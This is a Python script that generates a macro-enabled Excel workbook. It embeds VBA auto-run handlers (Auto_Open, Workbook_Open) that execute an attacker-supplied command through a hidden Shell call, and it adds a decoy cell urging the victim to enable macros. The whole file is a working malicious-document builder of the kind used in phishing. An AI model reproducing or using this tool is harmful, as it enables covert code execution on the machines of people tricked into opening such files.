import datetime
import win32com.client as win32
from pathlib import Path

def payloadExcel(payload_choice):
        
        
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        script_dir = Path(__file__).resolve().parent
        file_path = script_dir / f"macro_{timestamp}.xlsm"

        vba_macro = f'''
            Sub Auto_Open()
                AutoExec
            End Sub

            Sub Workbook_Open()
                AutoExec
            End Sub

            Sub AutoExec()
                Dim cmd As String
                {payload_choice}
                Shell cmd, vbHide
            End Sub
        '''

        try:
            excel = win32.gencache.EnsureDispatch('Excel.Application')
            excel.Visible = False
            wb = excel.Workbooks.Add()

            # Save first to establish file
            wb.SaveAs(str(file_path), FileFormat=52)

            vb_proj = wb.VBProject
            vb_component = vb_proj.VBComponents.Add(1)
            vb_component.CodeModule.AddFromString(vba_macro)
            
            wb.Sheets(1).Cells(1, 1).Value = "Loading data... Please enable macros."
            wb.Save()
            wb.Close(False)
            excel.Quit()
            print(f"Macro-enabled Excel document saved to: {file_path}")
            print("succesfully generated excel document !!")

            print(f"Excel macro payload saved to: {file_path}")
        except Exception as e:
            print(f"[!] Failed to generate Excel macro: {e}")